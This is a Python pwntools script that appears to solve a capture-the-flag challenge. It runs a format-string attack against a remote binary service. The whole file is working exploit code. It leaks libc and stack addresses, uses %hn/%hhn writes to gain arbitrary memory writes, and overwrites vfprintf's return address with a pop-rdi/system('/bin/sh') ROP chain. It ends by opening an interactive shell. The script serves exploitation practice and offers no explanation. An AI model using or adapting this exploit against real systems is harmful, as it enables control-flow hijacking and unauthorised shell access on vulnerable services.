from math import floor
from pwn import *

context.arch = 'amd64'

# host = 'csie.ctf.tw'
# port = 10136
host = '127.0.0.1'
port = 8888
r = remote(host, port)

# debug = True if host == '127.0.0.1' else False
debug = True
def debug_input(msg):
    global debug
    input(msg)

debug_input('Press Enter to continue.')

idx_libc_csu_init = 8
idx_libc_start_main_240 = 9
idx_and_argv = 11
idx_argv = idx_and_argv + 0xd*2

__libc_start_main_off = 0x0000000000020740
system_off = 0x0000000000045390
execve_off = 0x00000000000cc770

# leak memory & stack address
r.recvuntil(':')
payload = '%' + str(idx_libc_start_main_240) + '$p'
payload += '%' + str(idx_and_argv) + '$p'
payload += '%' + str(idx_libc_csu_init) + '$p'
payload += 'x'
payload = payload.encode()
r.sendline(payload)

# leak libc address
r.recvuntil('0x')
__libc_start_main_240 = int(r.recvuntil('0x')[:-2], 16)
__libc_start_main = __libc_start_main_240 - 240
libc = __libc_start_main - __libc_start_main_off

# calculate system address
system = system_off + libc
execve = execve_off + libc
print('system        =', hex(system))
print('execve        =', hex(execve))

# leak argv address on stack
argv = int(r.recvuntil('0x')[:-2], 16)
print('argv          =', hex(argv))

# calculate iter on stack
iter_i = argv - (0x7fff9bf081b8 - 0x7fff9bf080c8) + 4
vfprintf_ret = argv + 0x7ffd77a08cf8 - 0x7ffd77a08ed8
printf_ret = vfprintf_ret + 0x7ffc71bca058 - 0x7ffc71bc9f78
print('iter_i        =', hex(iter_i))
print('vfprintf_ret  =', hex(vfprintf_ret))
# print('printf_ret    =', hex(printf_ret))

# leak buf address
__libc_csu_init = int(r.recvuntil('x')[:-1], 16)
pop_rdi = __libc_csu_init + 99
buf = __libc_csu_init + (0x555555755020 - 0x555555554a80)
print('pop_rdi       =', hex(pop_rdi))
print('buf           =', hex(buf))

# leak argv_0 address
payload = '%' + str(idx_argv) + '$p'
payload = payload.encode().ljust(0x10, b'z')
r.recvuntil(':')
r.send(payload)
origin_argv_0 = int(r.recvuntil('z')[:-1], 16)
# idx_argv_0 = idx_argv+(argv_0 - argv)//0x8

# pick argv[0 ~ argv_num]
argv_0 = argv + 0x8 + 0x10
idx_argv_0 = idx_argv + 1+2
argv_num = 1+10
argvs = []
idx_argvs = []
for i in range(argv_num):
    argvs += [argv_0 + 0x8*i]
    idx_argvs += [idx_argv_0 + i]
print('argv_0        =', hex(argv_0))

fmt_recvn = 0
def fmt(prev, val, idx, byte):
    global fmt_recvn
    if byte == 1:
        prev &= 0xff
        full = 0x100
        hn_hnn = '$hhn'
    elif byte == 2:
        prev &= 0xffff
        full = 0x10000
        hn_hnn = '$hn'
    ret = ''
    if val > prev:
        ret = '%' + str(val - prev) + 'c'
        fmt_recvn += val - prev
    elif val < prev:
        ret = '%' + str(full + val - prev) + 'c'
        fmt_recvn += full + val - prev
    ret += '%' + str(idx) + hn_hnn
    return ret.encode()

def fmt_send_recv(val, idx, byte):
    payload = fmt(0, val, idx, byte)
    if len(payload) < 0x10:
        payload = payload.ljust(0x10, b'\x00')
    r.recvuntil(':')
    r.send(payload)
    r.recvn(val)

def fmt_make_new_addr(stack_addr, val):
    """Write val to stack_addr.
    Note: stack_addr should be able to be touched by %*$p.
    """
    global idx_argv
    global idx_and_argv

    fmt_send_recv(stack_addr & 0xff, idx_and_argv, 1)
    fmt_send_recv(val & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x2) & 0xff, idx_and_argv, 1)
    fmt_send_recv((val>>0x10) & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x4) & 0xff, idx_and_argv, 1)
    fmt_send_recv((val>>0x20) & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x6) & 0xff, idx_and_argv, 1)
    fmt_send_recv((val>>0x30) & 0xffff, idx_argv, 2)

    fmt_send_recv(stack_addr & 0xff, idx_and_argv, 1)

# make more loop
# TODO: make this more robust by overwriting more bytes
debug_input('Make more loop.')
fmt_send_recv(iter_i&0xffff, idx_and_argv, 2)
fmt_send_recv(0xffff, idx_argv, 2)

fmt_send_recv(argv_0&0xffff, idx_and_argv, 2)

def fmt_write_to_addr(addr, val):
    """Write val to addr.
    implementation:
        Make addr on stack, and write val to that addr.
    """
    global idx_argv_0

    fmt_make_new_addr(argv_0, addr)
    fmt_send_recv(val & 0xff, idx_argv_0, 1)

    for i in range(1, 8):
        fmt_send_recv((addr+i) & 0xff, idx_argv, 1)
        fmt_send_recv((val>>(0x8*i)) & 0xff, idx_argv_0, 1)

# Write "/bin/sh".
debug_input('Write "/bin/sh".')
fmt_write_to_addr(vfprintf_ret+0x8, argvs[7])

# Create final_payload.
fmt_recvn = 0
final_payload = fmt(0, pop_rdi&0xffff, idx_argvs[1], 2)
final_payload += fmt((pop_rdi>>0*0x8)&0xffff, (pop_rdi>>2*0x8)&0xffff, idx_argvs[2], 2)
final_payload += fmt((pop_rdi>>2*0x8)&0xffff, (pop_rdi>>4*0x8)&0xffff, idx_argvs[3], 2)
final_payload += fmt((pop_rdi>>4*0x8)&0xffff, (system>>0*0x8)&0xffff, idx_argvs[4], 2)
final_payload += fmt((system>>0*0x8)&0xffff, (system>>2*0x8)&0xffff, idx_argvs[5], 2)
final_payload += fmt((system>>2*0x8)&0xffff, (system>>4*0x8)&0xffff, idx_argvs[6], 2)
print(len(final_payload))   # len = 89 = 0x59
final_payload = final_payload.ljust((floor(len(final_payload)/8)+1)*8, b'\x00')
print(final_payload)

# Write payload to buf+0x10.
debug_input('Write payload to buf+0x10.')
for i in range(0x10, len(final_payload), 0x8):
    fmt_write_to_addr(buf+i, u64(final_payload[i:i+0x8]))

# Write addresses to argvs[].
debug_input('Write addresses to argvs[].')
fmt_make_new_addr(argvs[1], vfprintf_ret+0)
fmt_make_new_addr(argvs[2], vfprintf_ret+2)
fmt_make_new_addr(argvs[3], vfprintf_ret+4)
fmt_make_new_addr(argvs[4], vfprintf_ret+0x10+0)
fmt_make_new_addr(argvs[5], vfprintf_ret+0x10+2)
fmt_make_new_addr(argvs[6], vfprintf_ret+0x10+4)
fmt_make_new_addr(argvs[7], u64(b'/bin//sh'.ljust(8, b'\x00')))
fmt_make_new_addr(argvs[8], u64(b'\x00'*8))
# fmt_make_new_addr(argvs[7], u64(b'/bin/sh'.ljust(8, b'\x00')))

# Restore origin_argv_0.
debug_input('Restore origin_argv_0.')
fmt_make_new_addr(origin_argv_0, 0);
fmt_send_recv(origin_argv_0&0xff, idx_and_argv, 1)

# Send final_payload.
debug_input('Send final_payload.')
r.send(final_payload[:0x10])

# Receive a lot of blank.
r.recvn(fmt_recvn)

r.interactive()
